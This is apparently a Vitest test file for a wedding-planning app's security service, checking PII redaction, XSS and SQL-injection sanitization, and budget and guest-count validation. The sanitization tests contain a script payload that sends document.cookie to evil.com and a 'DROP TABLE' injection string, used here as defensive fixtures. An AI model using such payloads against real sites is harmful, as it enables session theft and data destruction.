import { describe, it, expect } from 'vitest';
import { redactPII, sanitizeInput, validateBudgetInput, validateGuestCountInput } from '@/services/security';

describe('Security Service: PII Redaction', () => {
  it('masks single and multiple email addresses with [REDACTED]', () => {
    const input = 'Contact our lead coordinator at wedding.planner@festiva.ai or backup@domain.co.in';
    const output = redactPII(input);
    expect(output).not.toContain('wedding.planner@festiva.ai');
    expect(output).not.toContain('backup@domain.co.in');
    expect(output).toContain('[REDACTED]');
  });

  it('masks phone numbers across international and Indian 10-digit formats with [REDACTED]', () => {
    const numbers = [
      'Reach out at +91 98765 43210 for decor discussions.',
      'Call mobile 9876543210 immediately.',
      'Emergency vendor contact: (555) 234-5678.',
    ];

    numbers.forEach((text) => {
      const output = redactPII(text);
      expect(output).not.toContain('9876543210');
      expect(output).not.toContain('234-5678');
      expect(output).toContain('[REDACTED]');
    });
  });

  it('masks credit card and financial tokens with [REDACTED]', () => {
    const text = 'Card deposit reference: 4111 2222 3333 4444 on file.';
    const output = redactPII(text);
    expect(output).not.toContain('4111 2222 3333 4444');
    expect(output).toContain('[REDACTED]');
  });

  it('masks Indian PAN numbers with [REDACTED]', () => {
    const text = 'Catering invoice registered under PAN ABCDE1234F.';
    const output = redactPII(text);
    expect(output).not.toContain('ABCDE1234F');
    expect(output).toContain('[REDACTED]');
  });

  it('preserves non-sensitive celebratory text intact', () => {
    const normal = 'Grand Rajasthani themed sangeet with live Shehnai music for 250 guests in Jaipur.';
    const output = redactPII(normal);
    expect(output).toBe(normal);
  });
});

describe('Security Service: Input Sanitization (XSS Prevention)', () => {
  it('strips HTML, style and script tags cleanly', () => {
    const malicious = '<script>fetch("http://evil.com?c="+document.cookie)</script><b onmouseover="alert(1)">Royal Wedding</b>';
    const output = sanitizeInput(malicious);
    expect(output).not.toContain('<script>');
    expect(output).not.toContain('</script>');
    expect(output).not.toContain('<b');
    expect(output).toContain('Royal Wedding');
  });

  it('strips SQL injection syntax tokens', () => {
    const malicious = "Jaipur Palace'; DROP TABLE venues; SELECT * FROM credentials;--";
    const output = sanitizeInput(malicious);
    expect(output).not.toContain('DROP TABLE');
    expect(output).not.toContain('SELECT * FROM');
    expect(output).not.toContain(';--');
  });

  it('enforces maximum character truncation at 500 characters', () => {
    const huge = 'A'.repeat(700);
    const output = sanitizeInput(huge);
    expect(output.length).toBeLessThanOrEqual(500);
  });
});

describe('Security Service: Numerical Input Validation', () => {
  it('blocks negative budget inputs and ₹0 budgets with explicit security errors', () => {
    const negative = validateBudgetInput(-50000);
    expect(negative.valid).toBe(false);
    expect(negative.error).toContain('strictly greater than ₹0');

    const zero = validateBudgetInput(0);
    expect(zero.valid).toBe(false);
    expect(zero.error).toContain('strictly greater than ₹0');
  });

  it('enforces minimum viable budget threshold (₹10,000)', () => {
    const tooLow = validateBudgetInput(500);
    expect(tooLow.valid).toBe(false);
    expect(tooLow.error).toContain('Minimum viable budget is ₹10,000');
  });

  it('accepts valid positive budgets within realistic ceiling', () => {
    const valid = validateBudgetInput(1500000);
    expect(valid.valid).toBe(true);
    expect(valid.error).toBeUndefined();
  });

  it('blocks 0 guests and negative attendance inputs', () => {
    const zeroGuests = validateGuestCountInput(0);
    expect(zeroGuests.valid).toBe(false);
    expect(zeroGuests.error).toContain('strictly greater than 0');

    const negativeGuests = validateGuestCountInput(-15);
    expect(negativeGuests.valid).toBe(false);
    expect(negativeGuests.error).toContain('strictly greater than 0');
  });

  it('accepts valid guest counts within venue capacity ceiling', () => {
    const valid = validateGuestCountInput(300);
    expect(valid.valid).toBe(true);
    expect(valid.error).toBeUndefined();
  });
});
